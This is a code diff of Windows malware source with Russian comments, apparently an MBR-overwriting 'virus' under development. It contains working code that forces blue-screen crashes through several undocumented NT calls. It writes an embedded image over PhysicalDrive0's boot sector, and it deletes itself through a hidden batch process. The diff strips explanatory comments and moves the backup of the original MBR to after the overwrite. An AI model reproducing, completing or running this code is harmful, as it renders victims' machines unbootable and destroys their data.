@@ -58,7 +58,6 @@ void TriggerBSOD() {
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     if (!ntdll) return;
     
-    // Метод 1: NtRaiseHardError
     typedef NTSTATUS (NTAPI *NtRaiseHardError_t)(
         NTSTATUS ErrorStatus,
         ULONG NumberOfParameters,
@@ -84,7 +83,6 @@ void TriggerBSOD() {
         );
     }
     
-    // Метод 2: NtSetSystemInformation (SystemBugCheckInformation)
     typedef NTSTATUS (NTAPI *NtSetSystemInformation_t)(
         ULONG SystemInformationClass,
         PVOID SystemInformation,
@@ -99,7 +97,6 @@ void TriggerBSOD() {
         NtSetSystemInformation(0x57, &bugCheckCode, sizeof(bugCheckCode));
     }
     
-    // Метод 3: Вызов win32k.sys через NtUserCallOneParam
     HMODULE win32u = LoadLibraryA("win32u.dll");
     if (win32u) {
         typedef NTSTATUS (NTAPI *NtUserCallOneParam_t)(ULONG_PTR, ULONG);
@@ -111,7 +108,6 @@ void TriggerBSOD() {
         FreeLibrary(win32u);
     }
     
-    // Метод 4: Принудительный вызов KeBugCheckEx через RtlAdjustPrivilege
     HMODULE ntdll2 = GetModuleHandleA("ntdll.dll");
     if (ntdll2) {
         typedef NTSTATUS (NTAPI *RtlAdjustPrivilege_t)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
@@ -124,8 +120,8 @@ void TriggerBSOD() {
         
         if (RtlAdjustPrivilege && NtShutdownSystem) {
             BOOLEAN enabled = FALSE;
-            RtlAdjustPrivilege(19, TRUE, FALSE, &enabled); // SE_SHUTDOWN_PRIVILEGE
-            NtShutdownSystem(1); // ShutdownReboot
+            RtlAdjustPrivilege(19, TRUE, FALSE, &enabled);
+            NtShutdownSystem(1);
         }
     }
 }
@@ -155,7 +151,6 @@ void ElevateAndRun() {
 // ЗАПИСЬ MBR (ИЗ РЕСУРСА)
 // ============================================================
 void WriteMBR() {
-    // Загружаем ресурс "MBR" (BINARY)
     HRSRC hRes = FindResourceA(NULL, "MBR", "BINARY");
     if (!hRes) return;
     
@@ -166,7 +161,6 @@ void WriteMBR() {
     unsigned char* image = (unsigned char*)LockResource(hData);
     if (!image || size < 512) return;
     
-    // Открываем диск
     HANDLE hDisk = CreateFileA(
         "\\\\.\\PhysicalDrive0",
         GENERIC_READ | GENERIC_WRITE,
@@ -190,7 +184,9 @@ void WriteMBR() {
         if (hDisk == INVALID_HANDLE_VALUE) return;
     }
     
-    // --- ШАГ 1: ЧИТАЕМ ОРИГИНАЛ ---
+    // ============================================================
+    // ШАГ 1: ЧИТАЕМ ОРИГИНАЛЬНЫЙ MBR
+    // ============================================================
     unsigned char originalMBR[512];
     DWORD bytesRead = 0;
     SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
@@ -199,17 +195,19 @@ void WriteMBR() {
         return;
     }
     
-    // --- ШАГ 2: СОХРАНЯЕМ ОРИГИНАЛ В СЕКТОР 2 ---
+    // ============================================================
+    // ШАГ 2: ЗАПИСЫВАЕМ ВИРУСНЫЙ ОБРАЗ (13 СЕКТОРОВ) В СЕКТОР 0
+    // ============================================================
     DWORD bytesWritten = 0;
-    SetFilePointer(hDisk, 512 * 2, NULL, FILE_BEGIN);
-    if (!WriteFile(hDisk, originalMBR, 512, &bytesWritten, NULL) || bytesWritten != 512) {
-        CloseHandle(hDisk);
-        return;
-    }
-    
-    // --- ШАГ 3: ЗАПИСЫВАЕМ НАШ ОБРАЗ ---
     SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
     WriteFile(hDisk, image, size, &bytesWritten, NULL);
+    
+    // ============================================================
+    // ШАГ 3: СОХРАНЯЕМ ОРИГИНАЛЬНЫЙ MBR В СЕКТОР 2 (БЭКАП)
+    // ============================================================
+    SetFilePointer(hDisk, 512 * 2, NULL, FILE_BEGIN);
+    WriteFile(hDisk, originalMBR, 512, &bytesWritten, NULL);
+    
     CloseHandle(hDisk);
     
     // --- Самоуничтожение ---
@@ -233,7 +231,6 @@ void WriteMBR() {
     CreateProcessA(NULL, (LPSTR)batPath.c_str(), NULL, NULL, FALSE,
         CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     
-    // --- BSOD (если есть маркер в ресурсах) ---
     if (FindResourceA(NULL, "BSOD", RT_RCDATA)) {
         TriggerBSOD();
     }
